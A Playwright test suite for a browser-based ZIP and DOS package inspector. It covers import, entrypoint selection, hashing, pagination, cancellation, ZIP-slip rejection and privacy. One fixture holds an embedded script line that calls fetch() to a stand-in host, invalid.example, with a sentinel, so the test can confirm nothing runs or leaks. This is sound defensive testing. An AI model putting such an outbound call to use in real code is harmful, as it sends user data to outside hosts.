import { test as base, expect } from '@playwright/test';
import { mkdir, writeFile } from 'node:fs/promises';
import { dirname, join } from 'node:path';
import { createHash } from 'node:crypto';
import { dosPackageFiles, mixedPackageFiles, packageFixtures, packageZip, textBytes } from '../fixtures/package-fixtures';
import type { PackageContents } from '../../src/packages/virtual-package';
import type { ApplicationPackage } from '../../src/domain/contracts';

const test = base.extend<{ health: void }>({
  health: [async ({ page, browser }, use, info) => {
    const errors: string[] = [];
    page.on('pageerror', error => errors.push(error.message));
    page.on('console', message => { if (message.type() === 'error') errors.push(message.text()); });
    info.annotations.push({ type: 'browser-version', description: browser.version() });
    await use(); expect(errors).toEqual([]);
  }, { auto: true }],
});
const archive = (bytes: Uint8Array, name = 'PRIVATE_PACKAGE_SENTINEL.zip') => ({ name, mimeType: 'application/zip', buffer: Buffer.from(bytes) });

test('real ZIP picker preserves the mixed package and asks for an explicit executable', async ({ page }) => {
  await page.goto('/');
  const chooser = page.waitForEvent('filechooser');
  await page.getByRole('button', { name: 'Import ZIP', exact: true }).click();
  await (await chooser).setFiles(archive(packageZip(mixedPackageFiles)));
  await page.getByRole('button', { name: 'Analyze file', exact: true }).click();
  await expect(page.getByRole('heading', { name: 'Package explorer' })).toBeVisible();
  await expect(page.getByTestId('entrypoint-status')).toHaveText('No entrypoint selected');
  await expect(page.getByRole('radio')).toHaveCount(2);
  await expect(page.locator('input[name="entrypoint"]:checked')).toHaveCount(0);
  await expect(page.getByText('May be an installer or uninstaller by name.', { exact: false })).toBeVisible();
  const dos = page.getByRole('radio', { name: 'Choose APP/MAIN.EXE as entrypoint', exact: true });
  await dos.focus(); await page.keyboard.press('Space'); await expect(dos).toBeChecked();
  await page.keyboard.press('ArrowDown');
  await expect(page.getByTestId('entrypoint-status')).toContainText('APP/TOOLS/SETUP.EXE');
  await expect(page.getByRole('list', { name: 'Package files' }).getByRole('listitem')).toHaveCount(8);
  await expect(page.getByRole('button', { name: 'Inspect APP/DATA/LEVEL.DAT', exact: true })).toBeVisible();
  await page.getByRole('button', { name: 'Inspect APP/MAIN.EXE', exact: true }).click();
  await expect(page.getByTestId('probe-report')).toContainText('MZ signature');
  await expect(page.getByTestId('entrypoint-status')).toContainText('APP/TOOLS/SETUP.EXE');
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
  await page.getByRole('link', { name: 'View compatibility', exact: true }).click();
  await expect(page.getByText('Chosen entrypoint: APP/TOOLS/SETUP.EXE', { exact: true })).toBeVisible();
  await expect(page.getByRole('button', { name: 'Run unavailable' })).toBeDisabled();
});

test('native folder input preserves relative paths including empty resources', async ({ page }, info) => {
  const root = info.outputPath('SelectedFolder');
  for (const entry of dosPackageFiles.filter(item => !item.path.endsWith('/'))) {
    const path = join(root, entry.path); await mkdir(dirname(path), { recursive: true }); await writeFile(path, entry.bytes);
  }
  await page.goto('/#/inspect');
  const chooser = page.waitForEvent('filechooser');
  await page.getByRole('button', { name: 'Choose folder', exact: true }).click();
  await (await chooser).setFiles(root);
  await expect(page.getByRole('heading', { level: 2, name: 'SelectedFolder', exact: true })).toBeVisible();
  await page.getByRole('button', { name: 'Analyze package', exact: true }).click();
  await expect(page.getByTestId('entrypoint-status')).toHaveText('No entrypoint selected');
  await expect(page.getByRole('button', { name: 'Inspect SelectedFolder/APP/DATA/LEVEL.DAT', exact: true })).toBeVisible();
  await expect(page.getByRole('button', { name: 'Inspect SelectedFolder/APP/EMPTY.DAT', exact: true })).toBeVisible();
  await page.getByLabel('Filter paths').fill('LEVEL');
  await expect(page.getByRole('list', { name: 'Package files' }).getByRole('listitem')).toHaveCount(1);
  await page.getByRole('navigation', { name: 'Main navigation' }).getByRole('link', { name: 'Workspace', exact: true }).click();
  await expect(page.locator('.workspace-file')).toContainText('6 files');
  await page.getByRole('button', { name: 'Clear selection', exact: true }).click();
  await expect(page.getByRole('heading', { name: 'A fresh workspace' })).toBeVisible();
});

test('empty, corrupt and ZIP-slip inputs fail cleanly with no partial filesystem', async ({ page }) => {
  await page.goto('/#/inspect');
  for (const [id, message] of [['empty-package', 'No files were found'], ['corrupt-package', 'ZIP is corrupt'], ['zip-slip', 'unsafe file name or path']]) {
    await page.getByLabel('Choose a ZIP archive').setInputFiles(archive(packageFixtures.find(item => item.id === id)!.bytes));
    await page.getByRole('button', { name: 'Analyze file', exact: true }).click();
    await expect(page.getByRole('alert')).toContainText(message!);
    await expect(page.getByRole('list', { name: 'Package files' })).toHaveCount(0);
    await expect(page.getByRole('radio')).toHaveCount(0);
  }
  await page.getByLabel('Choose a local file').setInputFiles(archive(packageZip(dosPackageFiles)));
  await page.getByRole('button', { name: 'Analyze file', exact: true }).click();
  await expect(page.getByRole('radio')).toHaveCount(1);
  await expect(page.getByRole('alert')).toHaveCount(0);
});

test('package explorer paginates and does not silently expand a nested archive', async ({ page }) => {
  const bytes = packageZip([{ path: 'inner.zip', bytes: packageZip(dosPackageFiles) },
    ...Array.from({ length: 85 }, (_, i) => ({ path: `data/file-${i.toString().padStart(3, '0')}.dat`, bytes: textBytes('data') }))]);
  await page.goto('/#/inspect');
  await page.getByLabel('Choose a ZIP archive').setInputFiles(archive(bytes));
  await page.getByRole('button', { name: 'Analyze file', exact: true }).click();
  const list = page.getByRole('list', { name: 'Package files' });
  await expect(list.getByRole('listitem')).toHaveCount(40);
  await page.getByRole('button', { name: 'Next files', exact: true }).click();
  await expect(list).toContainText('data/file-040.dat');
  await page.getByLabel('Filter paths').fill('inner.zip');
  await expect(list.getByRole('listitem')).toHaveCount(1);
  await expect(list).toContainText('Nested archives are never expanded');
  await expect(page.getByRole('radio')).toHaveCount(0);
  expect(await page.evaluate(() => document.documentElement.scrollWidth <= innerWidth)).toBe(true);
});

test('real worker preserves every file hash at the adapter package boundary', async ({ page }) => {
  await page.goto('/#/inspect');
  const result = await page.evaluate(async bytes => {
    const workerPath = '/src/packages/zip-worker-client.ts', packagePath = '/src/packages/virtual-package.ts';
    const { importZipInWorker } = await import(/* @vite-ignore */ workerPath) as {
      importZipInWorker(blob: Blob, signal: AbortSignal, progress: () => void): Promise<PackageContents> };
    const { virtualPackage } = await import(/* @vite-ignore */ packagePath) as {
      virtualPackage(contents: PackageContents, origin: string, label: string): ApplicationPackage };
    const signal = new AbortController().signal;
    const pkg = virtualPackage(await importZipInWorker(new Blob([new Uint8Array(bytes)]), signal, () => {}), 'zip', 'authored fixture');
    const hashes: Record<string, string> = {};
    for (const file of pkg.files) {
      const data = await file.read(0, file.size, signal);
      hashes[file.path] = Array.from(new Uint8Array(await crypto.subtle.digest('SHA-256', data as Uint8Array<ArrayBuffer>)))
        .map(byte => byte.toString(16).padStart(2, '0')).join('');
    }
    return { hashes, directories: pkg.directories, entrypoint: pkg.entrypoint, source: pkg.files.every(file => file.source === 'archive') };
  }, [...packageZip(dosPackageFiles)]);
  const expected = Object.fromEntries(dosPackageFiles.filter(item => !item.path.endsWith('/'))
    .map(item => [item.path, createHash('sha256').update(item.bytes).digest('hex')]));
  expect(result.hashes).toEqual(expected); expect(result.directories).toContain('APP/empty');
  expect(result.entrypoint).toBeUndefined(); expect(result.source).toBe(true);
  await expect.poll(() => page.workers().length).toBe(0);
});

test('page and worker traffic carry no names or bytes; no storage or script execution occurs', async ({ page, context }) => {
  const requests: string[] = [], frames: string[] = [], workerUrls: string[] = [];
  context.on('request', request => requests.push(`${request.method()} ${request.url()} ${request.postData() ?? ''}`));
  page.on('websocket', socket => socket.on('framesent', frame => frames.push(String(frame.payload))));
  page.on('worker', worker => workerUrls.push(worker.url()));
  await context.route('**/*', route => {
    const url = new URL(route.request().url());
    return url.origin === 'http://127.0.0.1:4176' ? route.continue() : route.abort();
  });
  const contents = [...dosPackageFiles, { path: 'PRIVATE_PATH_SENTINEL/script.js', bytes: textBytes('globalThis.SCRIPT_RAN = true; fetch("https://invalid.example/PRIVATE_BYTES_SENTINEL");') }];
  await page.goto('/#/inspect');
  await page.getByLabel('Choose a ZIP archive').setInputFiles(archive(packageZip(contents)));
  await page.getByRole('button', { name: 'Analyze file', exact: true }).click();
  await expect(page.getByRole('radio')).toHaveCount(1);
  await expect.poll(() => page.workers().length).toBe(0);
  expect(workerUrls.length).toBeGreaterThan(0);
  expect(workerUrls.every(url => url.includes('/src/packages/zip.worker.ts'))).toBe(true);
  const traffic = [...requests, ...frames].join('\n');
  for (const sentinel of ['PRIVATE_PACKAGE_SENTINEL', 'PRIVATE_PATH_SENTINEL', 'PRIVATE_BYTES_SENTINEL', Buffer.from(packageZip(contents)).toString('base64')]) {
    expect(traffic).not.toContain(sentinel); expect(traffic).not.toContain(encodeURIComponent(sentinel));
  }
  expect(requests.every(request => request.startsWith('GET http://127.0.0.1:4176/'))).toBe(true);
  expect(context.serviceWorkers()).toHaveLength(0);
  expect(await page.evaluate(async () => ({ ran: 'SCRIPT_RAN' in globalThis, local: localStorage.length, session: sessionStorage.length,
    databases: (await indexedDB.databases()).length, caches: (await caches.keys()).length })))
    .toEqual({ ran: false, local: 0, session: 0, databases: 0, caches: 0 });
});

test('cancelling a real extraction terminates its worker and a fresh package still imports', async ({ page }) => {
  // Authored inert bytes, large enough to observe the actual bounded read loop.
  const bytes = packageZip([{ path: 'data.bin', bytes: new Uint8Array(16 * 1024 * 1024), method: 0 }]);
  await page.goto('/#/inspect');
  await page.getByLabel('Choose a ZIP archive').setInputFiles(archive(bytes));
  const workerStarted = page.waitForEvent('worker');
  await page.getByRole('button', { name: 'Analyze file', exact: true }).click();
  await workerStarted;
  await page.getByRole('button', { name: 'Cancel analysis', exact: true }).click();
  await expect(page.locator('[data-session-state]')).toHaveAttribute('data-session-state', 'selected');
  await expect.poll(() => page.workers().length).toBe(0);
  await page.getByRole('button', { name: 'Clear selected file', exact: true }).click();
  await page.getByLabel('Choose a ZIP archive').setInputFiles(archive(packageZip(dosPackageFiles)));
  await page.getByRole('button', { name: 'Analyze file', exact: true }).click();
  await expect(page.getByRole('radio')).toHaveCount(1);
  await expect.poll(() => page.workers().length).toBe(0);
});
